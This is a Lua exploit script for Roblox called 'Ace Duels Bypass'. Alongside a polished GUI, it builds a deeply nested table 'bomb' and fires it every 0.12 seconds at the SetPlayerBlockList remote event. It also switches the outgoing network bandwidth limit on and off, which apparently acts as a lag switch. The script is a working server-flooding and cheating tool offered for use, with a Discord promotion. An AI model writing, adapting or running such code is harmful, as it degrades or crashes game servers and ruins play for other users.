repeat task.wait() until game:IsLoaded()
--[[
    Ace Duels Bypass
    GUI: dark silver glass, minimize/expand, LCTRL to hide
    Logic: PC/Mobile mode, configurable keybind, power 10k-150k/100k, spam loop v2 (0.12s)
    Config saved to AceDuelsConfig.json
]]

local UserInputService = game:GetService("UserInputService")
local HttpService      = game:GetService("HttpService")
local CoreGui          = game:GetService("CoreGui")
local TweenService     = game:GetService("TweenService")
local NetworkClient    = game:GetService("NetworkClient")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

-- ═══════════════════════════════════════════
--  Cleanup
-- ═══════════════════════════════════════════
local function CleanupOldGUIs()
    local existing = CoreGui:FindFirstChild("Ace Duels Bypass")
    if existing then existing:Destroy() end
end
CleanupOldGUIs()

-- ═══════════════════════════════════════════
--  Config
-- ═══════════════════════════════════════════
local ConfigFile = "AceDuelsConfig.json"
local Config = {
    Keybind      = "V",
    PCPower      = 97000,
    MobilePower  = 72000,
    Mode         = "PC",
}

local function SaveConfig()
    if writefile then
        pcall(function() writefile(ConfigFile, HttpService:JSONEncode(Config)) end)
    end
end

local function LoadConfig()
    if isfile and isfile(ConfigFile) then
        local ok, data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
        if ok and data then
            if type(data.Keybind)     == "string"                            then Config.Keybind     = data.Keybind end
            if type(data.PCPower)     == "number"                            then Config.PCPower     = math.clamp(data.PCPower,     10000, 150000) end
            if type(data.MobilePower) == "number"                            then Config.MobilePower = math.clamp(data.MobilePower, 10000, 100000) end
            if type(data.Mode)        == "string" and (data.Mode == "PC" or data.Mode == "Mobile") then Config.Mode = data.Mode end
        end
    end
end
LoadConfig()

-- ═══════════════════════════════════════════
--  Bomb builder
-- ═══════════════════════════════════════════
local DEPTH = 296

local function buildBomb(power)
    local maintable    = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, DEPTH do
        local t = {}
        table.insert(z, t)
        z = t
    end
    local maxRep = math.floor(power / (DEPTH + 2))
    for i = 1, maxRep do
        table.insert(maintable, spammedtable)
    end
    return maintable
end

-- ═══════════════════════════════════════════
--  ScreenGui
-- ═══════════════════════════════════════════
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name           = "Ace Duels Bypass"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn   = false
ScreenGui.Parent         = CoreGui

-- ═══════════════════════════════════════════
--  MAIN frame  (300 x 232, dark silver style)
-- ═══════════════════════════════════════════
local Main = Instance.new("Frame")
Main.Name                  = "Main"
Main.Active                = true
Main.ClipsDescendants      = true
Main.Position              = UDim2.new(0.5, -150, 0.5, -116)
Main.Size                  = UDim2.new(0, 300, 0, 232)
Main.BackgroundColor3      = Color3.fromRGB(10, 10, 12)
Main.BackgroundTransparency = 0.18
Main.BorderSizePixel       = 0
Main.Parent                = ScreenGui

local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0, 14)

local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color     = Color3.fromRGB(230, 230, 230)
MainStroke.Thickness = 2

-- Header
local Header = Instance.new("Frame", Main)
Header.Name                  = "Header"
Header.Active                = true
Header.Size                  = UDim2.new(1, 0, 0, 58)
Header.BackgroundColor3      = Color3.fromRGB(13, 13, 16)
Header.BackgroundTransparency = 0.14
Header.BorderSizePixel       = 0

local HeaderCorner = Instance.new("UICorner", Header)
HeaderCorner.CornerRadius = UDim.new(0, 14)

-- square to fill the bottom gap of the rounded header
local HeaderSquare = Instance.new("Frame", Header)
HeaderSquare.Position              = UDim2.new(0, 0, 1, -14)
HeaderSquare.Size                  = UDim2.new(1, 0, 0, 14)
HeaderSquare.BackgroundColor3      = Color3.fromRGB(13, 13, 16)
HeaderSquare.BackgroundTransparency = 0.14
HeaderSquare.BorderSizePixel       = 0

local TitleLabel = Instance.new("TextLabel", Header)
TitleLabel.Position         = UDim2.new(0, 15, 0, 0)
TitleLabel.Size             = UDim2.new(1, -58, 1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text             = "Ace Duels Bypass"
TitleLabel.TextColor3       = Color3.fromRGB(245, 245, 245)
TitleLabel.TextSize         = 15
TitleLabel.Font             = Enum.Font.GothamBlack
TitleLabel.TextXAlignment   = Enum.TextXAlignment.Left

local MinimizeBtn = Instance.new("TextButton", Header)
MinimizeBtn.Position         = UDim2.new(1, -35, 0, 17)
MinimizeBtn.Size             = UDim2.new(0, 22, 0, 22)
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 30)
MinimizeBtn.BorderSizePixel  = 0
MinimizeBtn.Text             = "-"
MinimizeBtn.TextColor3       = Color3.fromRGB(185, 185, 190)
MinimizeBtn.TextSize         = 15
MinimizeBtn.Font             = Enum.Font.GothamBlack
MinimizeBtn.AutoButtonColor  = false

local MinBtnCorner = Instance.new("UICorner", MinimizeBtn)
MinBtnCorner.CornerRadius = UDim.new(0, 6)
local MinBtnStroke = Instance.new("UIStroke", MinimizeBtn)
MinBtnStroke.Color = Color3.fromRGB(185, 185, 190)

-- Header divider line
local HeaderLine = Instance.new("Frame", Main)
HeaderLine.Position          = UDim2.new(0, 10, 0, 57)
HeaderLine.Size              = UDim2.new(1, -20, 0, 2)
HeaderLine.BackgroundColor3  = Color3.fromRGB(185, 185, 190)
HeaderLine.BorderSizePixel   = 0

local HeaderLineCorner = Instance.new("UICorner", HeaderLine)
HeaderLineCorner.CornerRadius = UDim.new(1, 0)

-- Body
local Body = Instance.new("Frame", Main)
Body.Position             = UDim2.new(0, 10, 0, 68)
Body.Size                 = UDim2.new(1, -20, 0, 130)
Body.BackgroundTransparency = 1

-- Helper: create a body row
local function MakeRow(yOffset)
    local Row = Instance.new("Frame", Body)
    Row.Position             = UDim2.new(0, 0, 0, yOffset)
    Row.Size                 = UDim2.new(1, 0, 0, 38)
    Row.BackgroundColor3     = Color3.fromRGB(18, 18, 21)
    Row.BackgroundTransparency = 0.3
    Row.BorderSizePixel      = 0
    local rc = Instance.new("UICorner", Row); rc.CornerRadius = UDim.new(0, 9)
    local rs = Instance.new("UIStroke", Row);  rs.Color = Color3.fromRGB(65, 65, 72)

    -- accent bar on left edge
    local Bar = Instance.new("Frame", Row)
    Bar.Position          = UDim2.new(0, 0, 0.5, -10)
    Bar.Size              = UDim2.new(0, 3, 0, 20)
    Bar.BackgroundColor3  = Color3.fromRGB(185, 185, 190)
    Bar.BorderSizePixel   = 0
    local bc = Instance.new("UICorner", Bar); bc.CornerRadius = UDim.new(1, 0)

    return Row
end

local function MakeRowLabel(parent, text)
    local lbl = Instance.new("TextLabel", parent)
    lbl.Position           = UDim2.new(0, 14, 0, 0)
    lbl.Size               = UDim2.new(0.55, 0, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text               = text
    lbl.TextColor3         = Color3.fromRGB(245, 245, 245)
    lbl.TextSize           = 11
    lbl.Font               = Enum.Font.GothamBold
    lbl.TextXAlignment     = Enum.TextXAlignment.Left
    return lbl
end

local function MakeSmallBtn(parent, xOffset, width, text)
    local btn = Instance.new("TextButton", parent)
    btn.Position         = UDim2.new(1, xOffset, 0.5, -12)
    btn.Size             = UDim2.new(0, width, 0, 24)
    btn.BackgroundColor3 = Color3.fromRGB(26, 26, 30)
    btn.BorderSizePixel  = 0
    btn.Text             = text
    btn.TextColor3       = Color3.fromRGB(185, 185, 190)
    btn.TextSize         = 10
    btn.Font             = Enum.Font.GothamMedium
    btn.AutoButtonColor  = false
    local c = Instance.new("UICorner", btn); c.CornerRadius = UDim.new(0, 7)
    local s = Instance.new("UIStroke", btn); s.Color = Color3.fromRGB(65, 65, 72)
    return btn, s
end

-- Row 1: Mode switch (PC | MOBILE)
local ModeRow = MakeRow(0)

local PCBtn = Instance.new("TextButton", ModeRow)
PCBtn.Position         = UDim2.new(0, 12, 0.5, -12)
PCBtn.Size             = UDim2.new(0.5, -17, 0, 24)
PCBtn.BackgroundColor3 = Color3.fromRGB(185, 185, 190)   -- active by default
PCBtn.BorderSizePixel  = 0
PCBtn.Text             = "PC"
PCBtn.TextColor3       = Color3.fromRGB(10, 10, 12)
PCBtn.TextSize         = 10
PCBtn.Font             = Enum.Font.GothamMedium
PCBtn.AutoButtonColor  = false
local PCBtnCorner = Instance.new("UICorner", PCBtn); PCBtnCorner.CornerRadius = UDim.new(0, 7)
local PCBtnStroke = Instance.new("UIStroke", PCBtn); PCBtnStroke.Color = Color3.fromRGB(185, 185, 190)

local MobileBtn = Instance.new("TextButton", ModeRow)
MobileBtn.Position         = UDim2.new(0.5, 5, 0.5, -12)
MobileBtn.Size             = UDim2.new(0.5, -17, 0, 24)
MobileBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 30)  -- inactive
MobileBtn.BorderSizePixel  = 0
MobileBtn.Text             = "MOBILE"
MobileBtn.TextColor3       = Color3.fromRGB(150, 150, 156)
MobileBtn.TextSize         = 10
MobileBtn.Font             = Enum.Font.GothamMedium
MobileBtn.AutoButtonColor  = false
local MobileBtnCorner = Instance.new("UICorner", MobileBtn); MobileBtnCorner.CornerRadius = UDim.new(0, 7)
local MobileBtnStroke = Instance.new("UIStroke", MobileBtn); MobileBtnStroke.Color = Color3.fromRGB(65, 65, 72)

-- Row 2: Power input
local PowerRow = MakeRow(46)
MakeRowLabel(PowerRow, "Power")

local PowerInput = Instance.new("TextBox", PowerRow)
PowerInput.Position          = UDim2.new(1, -100, 0.5, -12)
PowerInput.Size              = UDim2.new(0, 92, 0, 24)
PowerInput.BackgroundColor3  = Color3.fromRGB(32, 32, 36)
PowerInput.BorderSizePixel   = 0
PowerInput.Text              = tostring(Config.PCPower)
PowerInput.TextColor3        = Color3.fromRGB(230, 230, 230)
PowerInput.TextSize          = 10
PowerInput.Font              = Enum.Font.GothamMedium
PowerInput.PlaceholderText   = "Power"
PowerInput.ClearTextOnFocus  = false
local PowerInputCorner = Instance.new("UICorner", PowerInput); PowerInputCorner.CornerRadius = UDim.new(0, 7)
local PowerInputStroke = Instance.new("UIStroke", PowerInput); PowerInputStroke.Color = Color3.fromRGB(230, 230, 230)

-- Row 3: Bypass keybind + toggle
local BypassRow = MakeRow(92)
MakeRowLabel(BypassRow, "Bypass")

-- Keybind button (left of pair)
local KeybindBtn, KeybindStroke = MakeSmallBtn(BypassRow, -146, 70, Config.Keybind)

-- Toggle button (right of pair)
local ToggleBtn, ToggleStroke = MakeSmallBtn(BypassRow, -70, 62, "OFF")

-- Footer
local FooterLeft = Instance.new("TextLabel", Main)
FooterLeft.Position           = UDim2.new(0, 12, 1, -25)
FooterLeft.Size               = UDim2.new(0.55, -12, 0, 16)
FooterLeft.BackgroundTransparency = 1
FooterLeft.Text               = "discord.gg/aceduels"
FooterLeft.TextColor3         = Color3.fromRGB(245, 245, 245)
FooterLeft.TextSize           = 9
FooterLeft.Font               = Enum.Font.GothamBold
FooterLeft.TextXAlignment     = Enum.TextXAlignment.Left

local FooterRight = Instance.new("TextLabel", Main)
FooterRight.Position          = UDim2.new(0.55, 0, 1, -25)
FooterRight.Size              = UDim2.new(0.45, -12, 0, 16)
FooterRight.BackgroundTransparency = 1
FooterRight.Text              = "LCTRL TO HIDE"
FooterRight.TextColor3        = Color3.fromRGB(150, 150, 156)
FooterRight.TextSize          = 9
FooterRight.Font              = Enum.Font.GothamBold
FooterRight.TextXAlignment    = Enum.TextXAlignment.Right

-- ═══════════════════════════════════════════
--  MINI frame  (collapsed state - header only)
-- ═══════════════════════════════════════════
local Mini = Instance.new("Frame", ScreenGui)
Mini.Name                  = "Mini"
Mini.Visible               = false
Mini.Active                = true
Mini.ClipsDescendants      = true
Mini.Position              = UDim2.new(0.5, -150, 0.5, -116)
Mini.Size                  = UDim2.new(0, 300, 0, 58)
Mini.BackgroundColor3      = Color3.fromRGB(10, 10, 12)
Mini.BackgroundTransparency = 0.18
Mini.BorderSizePixel       = 0

local MiniCorner = Instance.new("UICorner", Mini); MiniCorner.CornerRadius = UDim.new(0, 14)
local MiniStroke = Instance.new("UIStroke", Mini); MiniStroke.Color = Color3.fromRGB(230, 230, 230); MiniStroke.Thickness = 2

local MiniHeader = Instance.new("Frame", Mini)
MiniHeader.Active                = true
MiniHeader.Size                  = UDim2.new(1, 0, 1, 0)
MiniHeader.BackgroundTransparency = 1
MiniHeader.BorderSizePixel       = 0

local MiniTitle = Instance.new("TextLabel", MiniHeader)
MiniTitle.Position         = UDim2.new(0, 15, 0, 0)
MiniTitle.Size             = UDim2.new(1, -58, 1, 0)
MiniTitle.BackgroundTransparency = 1
MiniTitle.Text             = "Ace Duels Bypass"
MiniTitle.TextColor3       = Color3.fromRGB(245, 245, 245)
MiniTitle.TextSize         = 15
MiniTitle.Font             = Enum.Font.GothamBlack
MiniTitle.TextXAlignment   = Enum.TextXAlignment.Left

local ExpandBtn = Instance.new("TextButton", MiniHeader)
ExpandBtn.Position         = UDim2.new(1, -35, 0, 17)
ExpandBtn.Size             = UDim2.new(0, 22, 0, 22)
ExpandBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 30)
ExpandBtn.BorderSizePixel  = 0
ExpandBtn.Text             = "+"
ExpandBtn.TextColor3       = Color3.fromRGB(185, 185, 190)
ExpandBtn.TextSize         = 15
ExpandBtn.Font             = Enum.Font.GothamBlack
ExpandBtn.AutoButtonColor  = false
local ExpandCorner = Instance.new("UICorner", ExpandBtn); ExpandCorner.CornerRadius = UDim.new(0, 6)
local ExpandStroke = Instance.new("UIStroke", ExpandBtn); ExpandStroke.Color = Color3.fromRGB(185, 185, 190)

-- ═══════════════════════════════════════════
--  State & logic
-- ═══════════════════════════════════════════
local running       = false
local bomb          = nil
local spamThread    = nil
local currentMode   = Config.Mode
local SPAM_DELAY    = 0.12
local guiVisible    = true   -- tracks LCTRL hide state

local function getCurrentPower()
    return currentMode == "PC" and Config.PCPower or Config.MobilePower
end

local function updateFooter()
    FooterRight.Text = tostring(getCurrentPower()) .. " pwr | LCTRL TO HIDE"
end

local function restartSpamLoop()
    if running then
        if spamThread then task.cancel(spamThread) end
        local power = getCurrentPower()
        bomb = buildBomb(power)
        spamThread = task.spawn(function()
            while running do
                if bomb then
                    pcall(function()
                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
                    end)
                end
                task.wait(SPAM_DELAY)
            end
        end)
    end
end

-- Toggle visual state
local function updateToggleVisuals(enabled)
    if enabled then
        ToggleBtn.Text      = "ENABLED"
        ToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 150)
        ToggleStroke.Color   = Color3.fromRGB(0, 255, 150)
        MainStroke.Color     = Color3.fromRGB(0, 255, 150)
        MiniStroke.Color     = Color3.fromRGB(0, 255, 150)
    else
        ToggleBtn.Text      = "DISABLED"
        ToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 156)
        ToggleStroke.Color   = Color3.fromRGB(65, 65, 72)
        MainStroke.Color     = Color3.fromRGB(230, 230, 230)
        MiniStroke.Color     = Color3.fromRGB(230, 230, 230)
    end
end

-- Mode button visuals
local function updateModeVisuals()
    if currentMode == "PC" then
        PCBtn.BackgroundColor3 = Color3.fromRGB(185, 185, 190)
        PCBtn.TextColor3       = Color3.fromRGB(10, 10, 12)
        PCBtnStroke.Color      = Color3.fromRGB(185, 185, 190)
        MobileBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 30)
        MobileBtn.TextColor3       = Color3.fromRGB(150, 150, 156)
        MobileBtnStroke.Color      = Color3.fromRGB(65, 65, 72)
        PowerInput.Text = tostring(Config.PCPower)
        KeybindBtn.TextColor3   = Color3.fromRGB(185, 185, 190)
        KeybindStroke.Color     = Color3.fromRGB(185, 185, 190)
    else
        MobileBtn.BackgroundColor3 = Color3.fromRGB(185, 185, 190)
        MobileBtn.TextColor3       = Color3.fromRGB(10, 10, 12)
        MobileBtnStroke.Color      = Color3.fromRGB(185, 185, 190)
        PCBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 30)
        PCBtn.TextColor3       = Color3.fromRGB(150, 150, 156)
        PCBtnStroke.Color      = Color3.fromRGB(65, 65, 72)
        PowerInput.Text = tostring(Config.MobilePower)
        -- dim keybind btn in mobile (not applicable)
        KeybindBtn.TextColor3   = Color3.fromRGB(60, 60, 66)
        KeybindStroke.Color     = Color3.fromRGB(40, 40, 46)
    end
    updateToggleVisuals(running)
    updateFooter()
end

-- Toggle bypass
local function ToggleBypass()
    running = not running
    updateToggleVisuals(running)
    if running then
        NetworkClient:SetOutgoingKBPSLimit(math.huge)
        restartSpamLoop()
    else
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
    end
end

-- Mode switch
local function SwitchMode(toMode)
    if running then
        running = false
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
    end
    currentMode  = toMode
    Config.Mode  = currentMode
    updateModeVisuals()
    SaveConfig()
end

-- ═══════════════════════════════════════════
--  Button connections
-- ═══════════════════════════════════════════
PCBtn.MouseButton1Click:Connect(function()
    if currentMode ~= "PC" then SwitchMode("PC") end
end)
MobileBtn.MouseButton1Click:Connect(function()
    if currentMode ~= "Mobile" then SwitchMode("Mobile") end
end)
ToggleBtn.MouseButton1Click:Connect(ToggleBypass)

-- Minimize / expand
MinimizeBtn.MouseButton1Click:Connect(function()
    Main.Visible = false
    Mini.Visible = true
end)
ExpandBtn.MouseButton1Click:Connect(function()
    Mini.Visible = false
    Main.Visible = true
end)

-- Power input
PowerInput.FocusLost:Connect(function()
    local n = tonumber(PowerInput.Text)
    if currentMode == "PC" then
        Config.PCPower = n and math.clamp(n, 10000, 150000) or 97000
        PowerInput.Text = tostring(Config.PCPower)
    else
        Config.MobilePower = n and math.clamp(n, 10000, 100000) or 72000
        PowerInput.Text = tostring(Config.MobilePower)
    end
    updateFooter()
    SaveConfig()
    if running then restartSpamLoop() end
end)

-- Keybind
local listeningForKey = false
KeybindBtn.MouseButton1Click:Connect(function()
    if currentMode ~= "PC" then return end
    listeningForKey           = true
    KeybindBtn.Text           = "..."
    KeybindBtn.TextColor3     = Color3.fromRGB(255, 200, 100)
    KeybindStroke.Color       = Color3.fromRGB(255, 200, 100)
end)

-- ═══════════════════════════════════════════
--  Global input: keybind fire + LCTRL hide
-- ═══════════════════════════════════════════
UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end

    -- LCTRL to toggle hide
    if input.KeyCode == Enum.KeyCode.LeftControl then
        guiVisible = not guiVisible
        if not guiVisible then
            Main.Visible = false
            Mini.Visible = false
        else
            -- restore whichever state was active
            Main.Visible = true
            Mini.Visible = false
        end
        return
    end

    -- Keybind capture
    if listeningForKey then
        Config.Keybind        = input.KeyCode.Name
        KeybindBtn.Text       = Config.Keybind
        KeybindBtn.TextColor3 = Color3.fromRGB(185, 185, 190)
        KeybindStroke.Color   = Color3.fromRGB(185, 185, 190)
        listeningForKey       = false
        SaveConfig()
        return
    end

    -- Fire keybind (PC mode only)
    if input.KeyCode.Name == Config.Keybind and currentMode == "PC" then
        ToggleBypass()
    end
end)

-- ═══════════════════════════════════════════
--  Draggable (drag by header on Main or Mini)
-- ═══════════════════════════════════════════
local dragging, dragStart, startPos

local function makeDraggable(frame, dragHandle)
    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging  = true
            dragStart = input.Position
            startPos  = frame.Position
        end
    end)
end

makeDraggable(Main, Header)
makeDraggable(Mini, MiniHeader)

UserInputService.InputChanged:Connect(function(input)
    if not dragging then return end
    if input.UserInputType ~= Enum.UserInputType.MouseMovement
    and input.UserInputType ~= Enum.UserInputType.Touch then return end
    local delta = input.Position - dragStart
    local target = Main.Visible and Main or Mini
    target.Position = UDim2.new(
        startPos.X.Scale, startPos.X.Offset + delta.X,
        startPos.Y.Scale, startPos.Y.Offset + delta.Y
    )
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- ═══════════════════════════════════════════
--  Initialise
-- ═══════════════════════════════════════════
updateModeVisuals()

print("Ace Duels Bypass GUI loaded")
